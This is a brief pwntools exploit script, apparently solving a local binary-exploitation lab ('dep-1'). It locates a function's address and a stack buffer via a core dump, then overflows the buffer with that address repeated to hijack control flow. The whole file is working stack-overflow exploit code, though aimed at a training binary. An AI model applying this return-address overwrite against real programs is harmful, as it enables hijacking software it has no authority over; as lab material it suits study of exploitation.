#! /usr/bin/env python

from pwn import *

p = process ('./dep-1')
#p = process ('./dep-1')

print (p.recv())

#gdb.attach(p)

context.terminal = ['tmux', 'splitw', '-h']

e = ELF ('./dep-1')
some_function = e.symbols['some_function']

print(hex(some_function))


buffer = "A" * 0x100

#p.sendline(buffer)
#p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buffer)

print(hex(buffer_addr))

buffer = p32(some_function)
while (len(buffer)) < 0x100:
    buffer += p32(some_function)


p.sendline(buffer)

p.interactive()
